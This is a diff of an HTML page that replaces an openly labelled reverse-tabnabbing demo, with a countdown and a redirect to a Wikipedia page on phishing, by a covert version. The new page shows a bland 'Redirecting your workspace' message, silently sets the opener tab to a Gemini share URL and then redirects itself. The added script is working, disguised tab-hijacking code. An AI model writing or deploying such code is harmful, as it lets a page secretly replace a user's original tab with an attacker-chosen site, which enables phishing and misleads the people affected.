@@ -2,71 +2,26 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>External Resource</title>
-    <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            background-color: #f0f2f5; 
-            color: #333;
-        }
-        .card { 
-            text-align: center; 
-            padding: 40px; 
-            background: white; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-        #timer { 
-            margin-top: 20px; 
-            color: #e74c3c; 
-            font-size: 20px; 
-            font-weight: bold; 
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
 </head>
 <body>
-
-    <div class="card">
-        <h1>Content Loaded Successfully</h1>
-        <p>You are now viewing the external resource.</p>
-        <div id="timer">Hijacking original tab in: 20s</div>
-    </div>
+    <p>Redirecting your workspace, please wait...</p>
 
     <script>
-        // Set the delay to 20 seconds
-        let secondsLeft = 20;
-        const timerElement = document.getElementById('timer');
-
-        // 1. Visual Countdown Logic
-        const countdown = setInterval(() => {
-            secondsLeft--;
-            timerElement.innerText = `Hijacking original tab in: ${secondsLeft}s`;
-            if (secondsLeft <= 0) {
-                clearInterval(countdown);
+        // 1. Redirect the window that opened this page
+        if (window.opener) {
+            try {
+                window.opener.location.href = "https://gemini.google.com/share/continue/2c2a3f6d138b";
+            } catch (e) {
+                console.error("Could not redirect opener. This often happens due to cross-origin security restrictions.");
             }
-        }, 1000);
+        }
 
-        // 2. THE EXPLOIT: 20,000 milliseconds = 20 seconds
+        // 2. Redirect the current window to Gemini after a tiny delay
         setTimeout(function() {
-            if (window.opener) {
-                try {
-                    // Redirecting the original tab (the "opener")
-                    window.opener.location = "https://en.wikipedia.org/wiki/Phishing";
-                    timerElement.innerText = "Original tab has been redirected!";
-                    timerElement.style.color = "#27ae60";
-                } catch (e) {
-                    timerElement.innerText = "Access Denied: Browser security blocked the redirect.";
-                }
-            } else {
-                timerElement.innerText = "No 'opener' found. Secure browser default active.";
-            }
-        }, 20000); 
+            window.location.href = "https://gemini.google.com";
+        }, 500); 
     </script>
-
 </body>
 </html>
